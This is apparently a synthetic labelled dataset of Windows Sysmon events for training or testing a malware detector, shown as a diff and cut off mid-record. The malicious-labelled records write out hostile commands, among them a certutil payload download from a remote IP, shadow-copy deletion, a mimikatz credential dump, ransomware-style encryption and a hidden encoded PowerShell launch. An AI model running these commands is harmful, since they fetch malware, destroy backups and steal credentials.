@@ -1,0 +1,4341 @@
+[
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\certutil.exe",
+    "CommandLine": "certutil -urlcache -split -f http://185.220.101.45/stage2.exe",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "User": "CORP\\alice",
+    "_label": 1
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\certutil.exe",
+    "CommandLine": "certutil -urlcache -split -f http://185.220.101.45/stage2.exe",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "User": "CORP\\alice",
+    "_label": 1
+  },
+  {
+    "EventID": 3,
+    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    "DestinationIp": "8.8.8.8",
+    "DestinationPort": 443,
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 10,
+    "SourceImage": "C:\\Windows\\System32\\cmd.exe",
+    "TargetImage": "C:\\Windows\\System32\\lsass.exe",
+    "GrantedAccess": "0x1010",
+    "User": "CORP\\finance1",
+    "_label": 1
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\vssadmin.exe",
+    "CommandLine": "vssadmin delete shadows /all /quiet",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "User": "CORP\\finance1",
+    "_label": 1
+  },
+  {
+    "EventID": 3,
+    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    "DestinationIp": "8.8.8.8",
+    "DestinationPort": 443,
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 11,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "TargetFilename": "C:\\Windows\\Prefetch\\CHROME.EXE-ABC12345.pf",
+    "User": "SYSTEM",
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\vssadmin.exe",
+    "CommandLine": "vssadmin delete shadows /all /quiet",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "User": "CORP\\finance1",
+    "_label": 1
+  },
+  {
+    "EventID": 11,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "TargetFilename": "C:\\Windows\\Prefetch\\CHROME.EXE-ABC12345.pf",
+    "User": "SYSTEM",
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "svchost.exe -k netsvcs -p -s BITS",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Hashes": "MD5=ABC123",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "svchost.exe -k netsvcs -p -s BITS",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Hashes": "MD5=ABC123",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\report.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "svchost.exe -k netsvcs -p -s BITS",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Hashes": "MD5=ABC123",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 10,
+    "SourceImage": "C:\\Windows\\System32\\cmd.exe",
+    "TargetImage": "C:\\Windows\\System32\\lsass.exe",
+    "GrantedAccess": "0x1010",
+    "User": "CORP\\finance1",
+    "_label": 1
+  },
+  {
+    "EventID": 3,
+    "Image": "C:\\Users\\Public\\loader.exe",
+    "DestinationIp": "185.220.101.45",
+    "DestinationPort": 4444,
+    "User": "CORP\\finance1",
+    "Signed": false,
+    "_label": 1
+  },
+  {
+    "EventID": 3,
+    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    "DestinationIp": "8.8.8.8",
+    "DestinationPort": 443,
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\report.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Users\\Public\\locker.exe",
+    "CommandLine": "locker.exe /encrypt C:\\Finance\\ /key abc123",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "User": "CORP\\finance1",
+    "Signed": false,
+    "_label": 1
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\vssadmin.exe",
+    "CommandLine": "vssadmin delete shadows /all /quiet",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "User": "CORP\\finance1",
+    "_label": 1
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\report.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\report.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 11,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "TargetFilename": "C:\\Windows\\Prefetch\\CHROME.EXE-ABC12345.pf",
+    "User": "SYSTEM",
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Users\\Public\\locker.exe",
+    "CommandLine": "locker.exe /encrypt C:\\Finance\\ /key abc123",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "User": "CORP\\finance1",
+    "Signed": false,
+    "_label": 1
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\vssadmin.exe",
+    "CommandLine": "vssadmin delete shadows /all /quiet",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "User": "CORP\\finance1",
+    "_label": 1
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "svchost.exe -k netsvcs -p -s BITS",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Hashes": "MD5=ABC123",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 11,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "TargetFilename": "C:\\Windows\\Prefetch\\CHROME.EXE-ABC12345.pf",
+    "User": "SYSTEM",
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\Temp\\mimikatz.exe",
+    "CommandLine": "mimikatz sekurlsa::logonpasswords exit",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "User": "CORP\\finance1",
+    "Hashes": "MD5=DEADBEEF",
+    "Signed": false,
+    "_label": 1
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "svchost.exe -k netsvcs -p -s BITS",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Hashes": "MD5=ABC123",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 3,
+    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    "DestinationIp": "8.8.8.8",
+    "DestinationPort": 443,
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\report.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "svchost.exe -k netsvcs -p -s BITS",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Hashes": "MD5=ABC123",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 11,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "TargetFilename": "C:\\Windows\\Prefetch\\CHROME.EXE-ABC12345.pf",
+    "User": "SYSTEM",
+    "_label": 0
+  },
+  {
+    "EventID": 3,
+    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    "DestinationIp": "8.8.8.8",
+    "DestinationPort": 443,
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 3,
+    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    "DestinationIp": "8.8.8.8",
+    "DestinationPort": 443,
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "svchost.exe -k netsvcs -p -s BITS",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Hashes": "MD5=ABC123",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 3,
+    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    "DestinationIp": "8.8.8.8",
+    "DestinationPort": 443,
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "svchost.exe -k netsvcs -p -s BITS",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Hashes": "MD5=ABC123",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "svchost.exe -k netsvcs -p -s BITS",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Hashes": "MD5=ABC123",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\report.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\report.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "svchost.exe -k netsvcs -p -s BITS",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Hashes": "MD5=ABC123",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "svchost.exe -k netsvcs -p -s BITS",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Hashes": "MD5=ABC123",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\cmd.exe",
+    "CommandLine": "cmd /c powershell -nop -w hidden -enc JABjAD0ATgBlAHcA",
+    "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 1
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\report.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\report.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\report.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\report.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 3,
+    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    "DestinationIp": "8.8.8.8",
+    "DestinationPort": 443,
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\report.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 3,
+    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    "DestinationIp": "8.8.8.8",
+    "DestinationPort": 443,
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 11,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "TargetFilename": "C:\\Windows\\Prefetch\\CHROME.EXE-ABC12345.pf",
+    "User": "SYSTEM",
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\vssadmin.exe",
+    "CommandLine": "vssadmin delete shadows /all /quiet",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "User": "CORP\\finance1",
+    "_label": 1
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Users\\Public\\locker.exe",
+    "CommandLine": "locker.exe /encrypt C:\\Finance\\ /key abc123",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "User": "CORP\\finance1",
+    "Signed": false,
+    "_label": 1
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\vssadmin.exe",
+    "CommandLine": "vssadmin delete shadows /all /quiet",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "User": "CORP\\finance1",
+    "_label": 1
+  },
+  {
+    "EventID": 10,
+    "SourceImage": "C:\\Windows\\System32\\cmd.exe",
+    "TargetImage": "C:\\Windows\\System32\\lsass.exe",
+    "GrantedAccess": "0x1010",
+    "User": "CORP\\finance1",
+    "_label": 1
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\report.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "svchost.exe -k netsvcs -p -s BITS",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Hashes": "MD5=ABC123",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "svchost.exe -k netsvcs -p -s BITS",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Hashes": "MD5=ABC123",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 3,
+    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    "DestinationIp": "8.8.8.8",
+    "DestinationPort": 443,
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 8,
+    "SourceImage": "C:\\Windows\\System32\\powershell.exe",
+    "TargetImage": "C:\\Windows\\System32\\svchost.exe",
+    "StartFunction": "NtCreateThread",
+    "User": "CORP\\alice",
+    "_label": 1
+  },
+  {
+    "EventID": 11,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "TargetFilename": "C:\\Windows\\Prefetch\\CHROME.EXE-ABC12345.pf",
+    "User": "SYSTEM",
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "svchost.exe -k netsvcs -p -s BITS",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Hashes": "MD5=ABC123",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\report.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 11,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "TargetFilename": "C:\\Windows\\Prefetch\\CHROME.EXE-ABC12345.pf",
+    "User": "SYSTEM",
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\report.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\cmd.exe",
+    "CommandLine": "cmd /c powershell -nop -w hidden -enc JABjAD0ATgBlAHcA",
+    "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 1
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\vssadmin.exe",
+    "CommandLine": "vssadmin delete shadows /all /quiet",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "User": "CORP\\finance1",
+    "_label": 1
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "svchost.exe -k netsvcs -p -s BITS",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Hashes": "MD5=ABC123",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\Temp\\mimikatz.exe",
+    "CommandLine": "mimikatz sekurlsa::logonpasswords exit",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "User": "CORP\\finance1",
+    "Hashes": "MD5=DEADBEEF",
+    "Signed": false,
+    "_label": 1
+  },
+  {
+    "EventID": 7,
+    "Image": "C:\\Windows\\System32\\rundll32.exe",
+    "ImageLoaded": "C:\\Users\\Temp\\evil.dll",
+    "Signed": false,
+    "User": "CORP\\alice",
+    "_label": 1
+  },
+  {
+    "EventID": 11,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "TargetFilename": "C:\\Windows\\Prefetch\\CHROME.EXE-ABC12345.pf",
+    "User": "SYSTEM",
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "svchost.exe -k netsvcs -p -s BITS",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Hashes": "MD5=ABC123",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 11,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "TargetFilename": "C:\\Windows\\Prefetch\\CHROME.EXE-ABC12345.pf",
+    "User": "SYSTEM",
+    "_label": 0
+  },
+  {
+    "EventID": 11,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "TargetFilename": "C:\\Windows\\Prefetch\\CHROME.EXE-ABC12345.pf",
+    "User": "SYSTEM",
+    "_label": 0
+  },
+  {
+    "EventID": 3,
+    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    "DestinationIp": "8.8.8.8",
+    "DestinationPort": 443,
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\report.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 11,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "TargetFilename": "C:\\Windows\\Prefetch\\CHROME.EXE-ABC12345.pf",
+    "User": "SYSTEM",
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\report.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "svchost.exe -k netsvcs -p -s BITS",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Hashes": "MD5=ABC123",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\report.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 10,
+    "SourceImage": "C:\\Windows\\System32\\cmd.exe",
+    "TargetImage": "C:\\Windows\\System32\\lsass.exe",
+    "GrantedAccess": "0x1010",
+    "User": "CORP\\finance1",
+    "_label": 1
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "svchost.exe -k netsvcs -p -s BITS",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Hashes": "MD5=ABC123",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "svchost.exe -k netsvcs -p -s BITS",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Hashes": "MD5=ABC123",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Users\\Public\\locker.exe",
+    "CommandLine": "locker.exe /encrypt C:\\Finance\\ /key abc123",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "User": "CORP\\finance1",
+    "Signed": false,
+    "_label": 1
+  },
+  {
+    "EventID": 3,
+    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    "DestinationIp": "8.8.8.8",
+    "DestinationPort": 443,
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 11,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "TargetFilename": "C:\\Windows\\Prefetch\\CHROME.EXE-ABC12345.pf",
+    "User": "SYSTEM",
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Users\\Public\\locker.exe",
+    "CommandLine": "locker.exe /encrypt C:\\Finance\\ /key abc123",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "User": "CORP\\finance1",
+    "Signed": false,
+    "_label": 1
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "svchost.exe -k netsvcs -p -s BITS",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Hashes": "MD5=ABC123",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 11,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "TargetFilename": "C:\\Windows\\Prefetch\\CHROME.EXE-ABC12345.pf",
+    "User": "SYSTEM",
+    "_label": 0
+  },
+  {
+    "EventID": 3,
+    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    "DestinationIp": "8.8.8.8",
+    "DestinationPort": 443,
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\cmd.exe",
+    "CommandLine": "cmd /c powershell -nop -w hidden -enc JABjAD0ATgBlAHcA",
+    "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 1
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "svchost.exe -k netsvcs -p -s BITS",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Hashes": "MD5=ABC123",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\report.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\report.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\vssadmin.exe",
+    "CommandLine": "vssadmin delete shadows /all /quiet",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "User": "CORP\\finance1",
+    "_label": 1
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "svchost.exe -k netsvcs -p -s BITS",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Hashes": "MD5=ABC123",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 11,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "TargetFilename": "C:\\Windows\\Prefetch\\CHROME.EXE-ABC12345.pf",
+    "User": "SYSTEM",
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\report.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\cmd.exe",
+    "CommandLine": "cmd /c powershell -nop -w hidden -enc JABjAD0ATgBlAHcA",
+    "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 1
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\report.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "svchost.exe -k netsvcs -p -s BITS",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Hashes": "MD5=ABC123",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\report.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 3,
+    "Image": "C:\\Users\\Public\\loader.exe",
+    "DestinationIp": "185.220.101.45",
+    "DestinationPort": 4444,
+    "User": "CORP\\finance1",
+    "Signed": false,
+    "_label": 1
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\report.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\report.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
